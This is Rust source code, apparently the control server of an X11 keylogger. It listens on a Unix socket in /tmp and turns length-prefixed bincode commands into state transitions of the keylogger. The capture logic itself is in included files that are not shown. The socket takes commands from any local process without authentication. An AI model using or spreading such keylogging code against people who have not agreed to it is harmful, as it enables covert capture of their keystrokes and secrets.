use std::io::prelude::*;
use std::os::unix::net::UnixListener;
use std::os::unix::net::UnixStream;

include!("../client_input.rs");
include!("../server_input.rs");
include!("../logger.rs");
include!("../keylogger_fsm.rs");
//include!("../keylog/keylog_factory.rs");

struct KeyLoggerFSM {
    state: Box<dyn State>,
}


fn main() -> std::io::Result<()> {
    let cli = ServerCli::parse();

    // TODO: log_file directory and 
    match init_logger(&cli.log_file, cli.log_lvl) {
        Ok(_) => (),
        Err(e) => println!("{e}"),
    };
    log::info!("Initialized logger");


    let listener = create_socket("/tmp/keylog.socket")?;
    log::info!("Created IPC socket");

    let mut keylogger = KeyLoggerFSM {
        state: Box::new(IdleState),
    };

    let mut x_keylogger = match KeyloggerFactory.create_keylogger(KeyloggerTypes::X) {
        Ok(xkeylogger) => xkeylogger,
        Err(e) => {
            log::error!("{:?}", e);
            panic!();
        }
    };

    // accept connections
    loop {
        // Accept blocks this thread, until a new connection is established!
        let (mut unix_stream, _socket_address) = listener.accept()?;
        log::debug!("Accepted socket connection.");
        let command = match handle_stream(unix_stream) {
            Ok(cmd) => cmd,
            Err(e) => {
                log::warn!("{:?}", e);
                continue
            }
        };

        keylogger.state = keylogger.state.transition(command, &mut x_keylogger);
    }
}

fn handle_stream(mut stream: UnixStream) -> Result<Commands, &'static str> {
    log::debug!("Parsing client command");
    let command = match receive_command(&mut stream) {
        Ok(cmd) => cmd,
        Err(_) => {
            log::warn!("Failed to interpret command");
            return Err("Unknown command or bad serialization");
        }
    };

    //println!("{:?}", command);
    Ok(command)
}

fn create_socket(socket_path: &str) -> std::io::Result<UnixListener> {
    // delete socket file, if it exists
    if std::fs::metadata(socket_path).is_ok() {
        log::debug!("Server socket already exists, deleting it.");
        std::fs::remove_file(socket_path)?;
    }

    // create new socket
    log::debug!("Creating new socket");
    UnixListener::bind(socket_path)
}

fn receive_command(stream: &mut UnixStream) -> Result<Commands, Box<dyn std::error::Error>> {
    // read length
    let mut len_bytes = [0u8; 4];
    stream.read_exact(&mut len_bytes)?;
    let len = u32::from_be_bytes(len_bytes) as usize;
    log::trace!("Command payload is {len} bytes long.");

    // read payload
    let mut buffer = vec![0u8; len];
    stream.read_exact(&mut buffer)?;
    log::trace!("Read command payload.");

    // deserialize
    let command: Commands = bincode::deserialize(&buffer)?;
    log::trace!("Deserialized command payload. Command is '{:?}'", command);
    Ok(command)
}

